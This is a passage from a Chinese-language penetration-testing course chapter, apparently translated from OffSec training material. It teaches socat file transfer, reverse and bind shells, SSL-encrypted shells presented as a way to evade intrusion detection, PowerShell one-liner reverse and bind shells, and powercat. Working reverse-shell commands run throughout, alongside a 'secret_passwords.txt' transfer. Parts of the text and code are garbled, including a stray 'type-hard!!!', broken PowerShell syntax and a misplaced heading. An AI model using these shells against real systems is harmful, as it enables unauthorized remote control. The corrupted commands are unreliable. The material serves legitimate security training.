
```
kali@kali:~ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```

> 图 93：使用 socat 传输文件

在 Bob 侧，我们将连接 Alice 并检索文件。在本例中，TCP 选项指定了 IPv4，随后是 Alice 的 IP 地址 (`10.11.0.4`) 和监听端口 (`443`)，`file` 指定了保存到 Bob 计算机的文件，`create` 指定了文件：

```
C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_passwords.txt
```

```
C:\Users\offsec> type-hard!!!
```

> 图 94：使用 socat 接收文件

### 4.2.3 Socat 反向 shell

看看使用 socat 的反向 shell。为此，Bob 将在端口 `443` 启动一个监听器。他将提供 `-d` 选项以增加详细性（显示致命、错误和通知消息），`TCP-LISTEN:443` 连接端口 `443` 的 IPv4 监听器，`STDOUT` 将标准输出（STDOUT）连接到 socket：

```
C:\Users\offsec> socat -d TCP-LISTEN:443 STDOUT
```

> 图 95：使用 socat 创建监听器

接下来，Alice 将使用 `EXEC` 选项（类似于 Netcat 选项），一旦建立反向 shell 连接，它将执行指定的程序。在这种情况下，Alice 将向 Bob 在 `10.11.0.22:443` 上的监听 socket 发送 `/bin/bash` reverse shell (`EXEC:/bin/bash`)：

```
kali@~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

> 图 96：使用 socat 发送反向 shell

一旦连接，Bob 可以从他的 shell 输入命令，这些命令将在 Alice 的机器上执行：

```
whoami
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

> 图 97：退出

这是一个很好的开始，我们涵盖了一些重要主题，但到目前，所有的网络活动都是明文的。让我们看看使用 socat 加密的基础：

### 4.2.4 Socat 加密绑定 shell

为了给绑定添加加密，我们将依靠 SSL 证书。这种级别的加密有助于规避入侵检测系统 (`IDS`) 并帮助隐藏我们接收的敏感数据。

继续 Alice 和 Bob 的示例，我们将使用 `openssl` 通过以下选项创建一个自签名证书：

- `req`：发起新的证书请求
- `newkey`：生成一个新的密钥
- `rsa2048`：使用 2048 位密钥的 RSA 加密
- `nodes`：不带密码存储私密钥
- `keyout`：将私密钥保存到文件
- `x509`：输出自签名证书而不是证书请求
- `days`：按天设置有效期
- `out`：将证书保存到文件

一旦生成密钥，我们将证书及其私密钥 `cat` 到文件中，最终我们将使用它来加密绑定 shell。

我们将在 Alice 的机器上通过此过程：

```
kali~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
Generating 2048 bit RSA private key
....
+++++++
writing new private key to 'bind_shell.key'
```

你将被要求输入将整合到证书请求中的信息。你即将输入的内容被称为区分名称（Distinguished Name，简称 DN）。由于某些字段会有默认值，如果你输入 '.'，该字段将留空。

国家名称（2 位代码）：US

州或省名称（全名）：Georgia

市名称（例如，城市）：Atlanta

组织名称（例如，公司）：Offsec

组织单位（例如，部门）：Try Hard Department

通用名称（例如，服务器 FQDN 或你的姓名）：

电子邮件地址：

```
kali~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
```

> 图 98：设置 socat

现在密钥和证书已经生成，我们首先需要将其转换为 socat 可用的格式。在创建加密的 socat shell 之前，将 `bind_shell.key` 和 `bind_shell.crt` 合并为 `.pem` 文件：

```
kali~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

现在，我们可以让 Bob 的机器连接到 Alice 的绑定 shell。

> 图 99：使用 socat 创建加密绑定 shell

我们将使用 `—` 来在 STDIO 和远程主机之间传输数据，使用 `OPENSSL` 在 Alice 在 `10.11.0.4:443` 上的监听器上建立远程 SSL 连接，并使用 `verify=0` 禁用 SSL 证书验证：

```
C:\Users\offsec> socat OPENSSL:10.11.0.4:443,verify=0
id=1000(kali) gid=1000(kali) groups=1000(kali)
whoami
kali
```

列表 100 - 使用 socat 连接到加密的 bind shell

太棒了！我们的 bind shell 已成功创建，我们能够向 Alice 的机器发送命令了。

花点时间自己探索一下 socat。这是在渗透测试期间非常有益的许多工具之一。

#### 4.2.4.1 练习

- 1. 使用 socat 将 `powercat.ps1` 从你的 Kali 机器传输到你的 Windows 系统。在下一节中使用你系统上的该文件。
- 2. 使用 socat 从你的 Windows 系统到你的 Kali 机器创建一个加密的反向 shell。
- 3. 在你的 Windows 系统上创建一个加密的 bind shell。尝试在不使用加密的情况下从 Kali 连接它。它有效吗？
- 4. 在你的 Windows 系统上创建一个未加密的 socat bind shell。使用 Netcat 连接到该 shell。它有效吗？

> 注意：如果 `cmd.exe` 没有执行，请根据收到的输出，研究你可能需要传递给 `EXEC` 选项的其他其他参数。

## 4.3 PowerShell 和 Powercat

Windows PowerShell 是一种基于任务的命令行 shell 和脚本语言。它专门为系统管理员和高级用户设计，用于快速自动化地管理多个操作系统（Linux、macOS、Unix 和 Windows）以及运行在这些系统上的进程。

不用说，PowerShell 是渗透测试的强大工具，可以安装在各种版本的 Windows 上（或在这些版本中默认安装）。从 Windows Server 2008 R2 和 Windows 7 开始，现代 Windows 平台默认带有 PowerShell。PowerShell 5.0 运行在以下 Windows 版本上：

- Windows Server 2016，默认安装
- Windows Server 2012 R2/Windows Server 2012/Windows Server 2008 R2 带有 Service Pack 1/8.1/Windows 7 带有 Service Pack 1（安装 Windows Management Framework 5.0 以运行它）

Windows PowerShell 4.0 运行在以下 Windows 版本上：

- Windows 8.1/Windows Server 2012 R2，默认安装
- Windows 7 带有 Service Pack 1/Windows Server 2008 R2 带有 Service Pack 1（安装 Windows Management Framework 4.0 以运行它）

Windows PowerShell 3.0 运行在以下 Windows 版本上：

- Windows 8/Windows Server 2012，默认安装
- Windows 7 带有 Service Pack 1/Windows Server 2008 R2 带有 Service Pack 1/2（安装 Windows Management Framework 3.0 以运行它）

PowerShell 包含一个集成环境（ISE），它允许你编写、测试和调试脚本。ISE 提供了代码补全、语法高亮、[https://docs.microsoft.com/en-us/powershell/v7.3/microsoft/powershell/about/powershell-ise](https://docs.microsoft.com/en-us/powershell/v7.3/microsoft/powershell/about/powershell-ise) 等功能。PowerShell 的执行策略决定哪些脚本可以运行。默认策略是“Restricted”，这可以保护你免受不受信任脚本的影响。更改执行策略可能会让你暴露于风险，例如，“Unrestricted”策略允许运行脚本，包括来自互联网的脚本。

# 使用 Kali Linux 2.0 进行渗透测试

循环后紧跟着关闭客户端连接的调用。在循环内部，我们可以看到几行负责向网络流中读取和写入数据的代码。请注意，`iex`（'Invoke-Expression'）是执行此操作的关键 cmdlet，因为它可以将任何字符串运行，并且命令的结果会被重定向并通过流作为命令传回：

这段代码可以粘贴到诚然很长的单行命令中并作为命令执行：

```hell
C:\Users\offsec> powershell $client = New-Object System.Net.Sockets.TCPClient('10.0.11.43');$stream = $client.GetStream();[byte[]]$bytes = 0;65535;|while($i = $stream.Read($bytes,0,$bytes.Length)-ne 0){$send = New-Object -TypeName System.Text.ASCIIEncoding;$send.GetBytes($bytes);$sendback = (iex $data 2>&1 | Out-String);$sendback = $sendback + ' ' + ($data.Path);$sendbyte = [text.encoding]::ASCII;$client.GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();$client.Close()}
```

这个单行命令初看之下可能非常费琐，但我们需要记住它；在现场渗透期间，我们很可能会复制粘贴此类命令（替换 IP 和端口号）。

最后，我们通过 Netcat 接收反弹 shell：

```
kali@kali: sudo nc -lnvp 443
listening on (any) 443 ...
connect to [10.0.11.4] [UNKNOWN] 63515
```

> 列表 106 - 使用 nc 接收反弹 shell

简而言之，通过简单地替换 `System.Net.Sockets.TCPClient` 中的 IP 地址和端口号，我们可以轻松地复用此 PowerShell 反弹 shell 命令。

## 4.3.3 PowerShell 绑定 Shell

处理绑定 shell（bind shells）时，过程是反过来的的。我们首先在 Bob 的电脑上通过 PowerShell 创建绑定 shell，然后从 Alice 的电脑使用 Netcat 连接它。

在下面的代码段中，我们将再次将命令传递给 `powershell -c` 选项。除了客户端、流和字节变量外，我们还有一个新的监听变量，它使用了 `System.Net.Sockets.TcpListener(443)` 类。该类需要两个参数：第一个用于监听，紧接着是端口。通过提供 `0.0.0.0` 作为本地地址，我们的绑定 shell 将在网络中的所有 IP 地址上可用。我们使用 `iex` cmdlet 执行我们的命令：

```hell
C:\Users\offsec> powershell $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$client = $listener.start();$stream = $client.GetStream();[byte[]]$bytes = 0;65535;|while($i = $stream.Read($bytes,0,$bytes.Length)-ne 0){$data = New-Object -TypeName System.Text.ASCIIEncoding;$send.GetBytes($bytes,0,1);$sendback = (iex $data 2>&1 | Out-String);$sendback = $sendback + ' ' + (pwd).Path + ' ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();$client.Close();$listener.Stop()
```

> 列表 107 - 使用 Netcat 设置绑定 shell

绑定监听开启后，我们可以像使用其他 shell 一样，从 Alice 的机器使用 Netcat 进行连接。我们为 Netcat 包含了 `-v` 选项，因为我们的绑定在连接时并不总是会显示命令：

```bash
kali@kali:~ nc -nv 10.1.0.22 443
(UNKNOWN) [10.1.0.22] 443 open
ipconfig
Windows IP Configuration
Ethernet adapter Connection:
Connection-specific DNSuffix: 
IPv4 Address                     : 10.1.0.22
Subnet Mask                      : 255.255.255.0
Default Gateway                  : 10.1.0.1
C:\Users\offsec>
```

> 列表 108 - 使用 nc 连接绑定 shell

PowerShell 极其强大，我们甚至还没有触及其功能的皮毛。由于微软对 Windows 管理中 PowerShell 的日益增加，了解如何使用 PowerShell 实现我们的目标至关重要。请参考 System.net 文档获取更多类和方法。

## 4.3.4 Powercat

Powercat 本质上是 Netcat 的 PowerShell 版本。它是我们可以下载到 Windows 主机的脚本，简化了绑定/反弹 shell 的创建。

可以在 Kali 中通过 `apt install powercat` 安装 powercat，会将脚本放在 `/usr/share/powercat/`。由于我们已经熟悉文件传输，跳过了从 Kali 机器传输脚本到 Windows 主机的这一步。

在目标主机上，我们通过使用 `.powercat.ps1` 开始。这将脚本中声明的所有变量和函数在当前 PowerShell 范围内可用。通过这种方式，我们可以直接使用 powercat 函数，而不是每次都执行脚本。值得注意的是，这样加载的脚本仅在当前的 PowerShell 实例有效，每次重启 PowerShell 都需要重新加载。现在我们的脚本已加载，可以执行 powercat：

```hell

PS C:\Users\offsec> .powercat.ps1

```

我们可以通过查看帮助菜单来快速熟悉 powercat：

```hell

PS C:\Users\offsec> powercat -h

Netcat, The PowerShell Version

Usage: powercat [-c or l] [-p] [options]

  -c Client Mode. 提供要连接的系统的 IP。

  -l Listen Mode. 在 -p 指定端口上启动监听器。

  -p <port> 要连接的端口或监听的端口。

  -e <proc> 执行。指定要启动的进程名称。

  -i <input> 输入。通过管道发送字节数组对象或字符串。对于移动文件，可以提供文件路径。你也可以管道任何内容，如 'aaaaaaa' | powercat -c 10.1.1.1 -p 80...

  -g Generate Payload. 返回带有指定选项执行的脚本字符串。-i、e 将包含在内。

  -ge Generate Encoded Payload. 与 -g 相同，但返回可以使用这种方式执行的字符串：powershell -E <encoded string>

  -h 打印此帮助消息。

```

> 列表 112 - Powercat 帮助菜单

让我们回顾如何像之前一样使用 powercat 进行文件传输和绑定反弹 shell。

## 4.3.5 Powercat 文件传输

虽然我们可以使用之前讨论的任何工具将 Powercat 传输到目标，但让我们看看使用 powercat 将自身（powercat.ps1）从 Bob 传输到 Alice 以演示文件传输。

首先，在 Alice 的电脑上运行 Netcat 监听：
```bash
